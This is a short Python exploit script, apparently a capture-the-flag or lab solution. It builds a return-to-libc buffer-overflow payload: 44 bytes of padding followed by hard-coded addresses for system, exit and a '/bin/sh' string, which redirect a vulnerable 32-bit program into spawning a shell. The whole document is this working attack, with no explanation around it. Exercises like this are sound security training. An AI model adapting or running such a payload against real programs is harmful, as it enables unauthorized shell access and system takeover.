import sys, struct

OFFSET   = 44              
ADDR_SYSTEM = 0x8052180   
ADDR_EXIT   = 0x80514a0   
ADDR_BINSH  = 0x80bafad

sys.stdout.buffer.write(b"a"*OFFSET+ struct.pack("<I", ADDR_SYSTEM)+ struct.pack("<I", ADDR_EXIT)+ struct.pack("<I", ADDR_BINSH))